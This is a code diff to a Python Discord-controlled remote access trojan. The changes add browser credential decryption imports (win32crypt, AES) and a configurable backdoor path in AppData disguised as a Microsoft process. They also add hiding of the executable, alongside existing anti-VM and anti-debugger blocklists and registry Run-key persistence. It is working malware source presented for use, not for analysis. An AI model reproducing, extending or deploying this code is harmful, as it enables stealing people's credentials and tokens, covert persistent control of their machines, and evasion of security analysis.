@@ -1,8 +1,8 @@
-import pyautogui, cv2, time, playsound, threading, win32api, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil
+import pyautogui, cv2, time, playsound, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, platform, shutil
 from discord.ext import commands
-from PIL import Image
+from Crypto.Cipher import AES
 from gtts import gTTS
-from ctypes import Structure, windll, c_uint, sizeof, byref
+from ctypes import Structure, c_uint
 from re import findall
 
 client = commands.Bot(command_prefix='!',intents=discord.Intents.all())
@@ -11,9 +11,22 @@ client.remove_command("help")
 ### CONFIGURATION
 
 token = "{token}"
-guild_id = "{guild_id}"
+guild_id = "{guildid}"
 autostart = "{autostart}"
 antivm = "{antivm}"
+
+process_name = "{processname}"
+if not process_name.endswith(".exe"):
+    process_name = process_name + ".exe"
+
+hide_after_exec = "{hideafterexec}"
+
+backdoor_location = "{backdoorlocation}"
+if backdoor_location == "\\AppData\\Roaming\\":
+    backdoor_location = os.environ["appdata"] + process_name
+else:
+    backdoor_location = os.environ["appdata"] + "Microsoft\\" + process_name
+
 annc_channel_id = "{announcements}"
 pass_channel_id = annc_channel_id
 tokens_channel_id = annc_channel_id
@@ -1035,6 +1048,10 @@ def mainfunc():
     bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
     bltask = ('vm3dservice', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')
 
+    if hide_after_exec != False:
+        p = os.popen('attrib +h "' + sys.executable + '"')
+        p.close()
+
     if antivm != False:
         result = subprocess.getoutput("tasklist")
         numb = len(result)
@@ -1062,7 +1079,6 @@ def mainfunc():
 
     if autostart != False:
         if sys.argv[0].endswith("exe"):
-            backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows-Updater.exe"
             if not os.path.exists(backdoor_location):
                 shutil.copyfile(sys.executable, backdoor_location)
                 key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -1072,7 +1088,6 @@ def mainfunc():
                 winreg.CloseKey(key)
                 subprocess.call(command, shell=True)
                 p = os.popen('attrib +h "' + backdoor_location + '"')
-                t = p.read()
                 p.close()
     
     
